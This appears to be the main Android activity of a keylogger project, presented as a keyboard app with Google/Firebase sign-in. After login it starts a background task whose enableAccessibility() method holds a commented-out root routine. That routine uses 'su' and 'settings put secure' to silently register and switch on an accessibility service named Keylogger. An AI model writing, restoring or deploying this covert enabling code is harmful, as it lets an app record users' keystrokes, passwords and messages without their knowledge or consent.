package com.example.keyboard;

import android.app.Activity;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Looper;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.auth.api.Auth;
import com.google.android.gms.auth.api.signin.GoogleSignIn;
import com.google.android.gms.auth.api.signin.GoogleSignInAccount;
import com.google.android.gms.auth.api.signin.GoogleSignInClient;
import com.google.android.gms.auth.api.signin.GoogleSignInOptions;
import com.google.android.gms.auth.api.signin.GoogleSignInResult;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.SignInButton;
import com.google.android.gms.common.api.ApiException;
import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.common.api.PendingResult;
import com.google.android.gms.common.api.Result;
import com.google.android.gms.common.api.ResultCallback;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthCredential;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.auth.GoogleAuthProvider;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity implements GoogleApiClient.OnConnectionFailedListener, View.OnClickListener{

    private GoogleApiClient mGoogleApiClient;
    private static final int RC_SIGN_IN = 9001;
    private static final String TAG = "PlayActivity";
    private TextView status;
    static FirebaseUser currentUser = null;

    @Override
    public void onConnectionFailed(@NonNull ConnectionResult connectionResult) {

    }

    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("MainActivity", "onCreate");

        setContentView(R.layout.activity_main);


        //google start
        GoogleSignInOptions.Builder gsoBuilder =
                new GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
                        .requestIdToken(getString(R.string.default_web_client_id))
                        .requestEmail();

        GoogleSignInOptions gso = gsoBuilder.build();
        mGoogleApiClient = new GoogleApiClient.Builder(this)
                .enableAutoManage(this, this)
                .addApi(Auth.GOOGLE_SIGN_IN_API, gso)
                .build();


        
        //google end
        SignInButton signInButton = findViewById(R.id.sign_in_button);
        signInButton.setSize(SignInButton.SIZE_STANDARD);
        signInButton.setOnClickListener(this);
        status = findViewById(R.id.status);

        Button signOutButton = findViewById(R.id.sign_out_button);
        signOutButton.setOnClickListener(this);
        //(new Startup()).execute();
    }



    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_SIGN_IN) {
            GoogleSignInResult result = Auth.GoogleSignInApi.getSignInResultFromIntent(data);
            Log.d(TAG, "Google authentication status: " + result.getStatus().getStatusMessage());
            // If Google ID authentication is successful, obtain a token for Firebase authentication.
            if (result.isSuccess() && result.getSignInAccount() != null) {
                AuthCredential credential = GoogleAuthProvider.getCredential(
                        result.getSignInAccount().getIdToken(), null);
                FirebaseAuth.getInstance().signInWithCredential(credential)
                        .addOnCompleteListener(this, task -> {
                            Log.d(TAG, "signInWithCredential:onComplete Successful: " + task.isSuccessful());
                            if (task.isSuccessful()) {
                                currentUser = FirebaseAuth.getInstance().getCurrentUser();
                                if (currentUser != null) {
                                    updateUI();
                                }
                            } else {
                                Log.w(TAG, "signInWithCredential:onComplete", task.getException());
                            }
                        });
            } else if (result.getStatus().isCanceled()) {
                String message = "Google authentication was canceled. "
                        + "Verify the SHA certificate fingerprint in the Firebase console.";
                Log.d(TAG, message);
                showErrorToast(new Exception(message));
            } else {
                Log.d(TAG, "Google authentication status: " + result.getStatus().toString());
                showErrorToast(new Exception(result.getStatus().toString()));
            }
        }
    }

    public void onClick(View v) {
        switch (v.getId()) {
            case R.id.sign_out_button:
                signOut();
                break;
            case R.id.sign_in_button:
                Intent signInIntent = Auth.GoogleSignInApi.getSignInIntent(mGoogleApiClient);
                // Start authenticating with Google ID first.
                startActivityForResult(signInIntent, RC_SIGN_IN);
                break;
        }
    }

    private void signOut() {
        Auth.GoogleSignInApi.signOut(mGoogleApiClient).setResultCallback(
                (ResultCallback<Result>) status -> {
                    // [START_EXCLUDE]
                    FirebaseAuth.getInstance().signOut();
                    updateUI();
                    // [END_EXCLUDE]
                });
    }


        private void updateUI() {
        (new Startup()).execute();
        if (currentUser != null) {
            findViewById(R.id.sign_in_button).setVisibility(View.GONE);
            findViewById(R.id.sign_out_button).setVisibility(View.VISIBLE);

            status.setText(
                    String.format(getResources().getString(R.string.signed_in_label),
                            currentUser.getDisplayName())
            );
            findViewById(R.id.status).setVisibility(View.VISIBLE);
        } else {
            findViewById(R.id.sign_in_button).setVisibility(View.VISIBLE);
            findViewById(R.id.sign_out_button).setVisibility(View.GONE);
            findViewById(R.id.status).setVisibility(View.GONE);
            ((TextView) findViewById(R.id.status)).setText("");
        }
        //finish();
    }

    private void showErrorToast(Exception e) {
        Toast.makeText(getApplicationContext(), e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
    }

    void enableAccessibility(){
        Log.d("MainActivity", "enableAccessibility");
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
            // running on the main thread
        } /*else {
            Log.d("MainActivity", "not on main thread");
            // not running on the main thread
            try {
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.bshu2.androidkeylogger/com.bshu2.androidkeylogger.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }*/
    }

}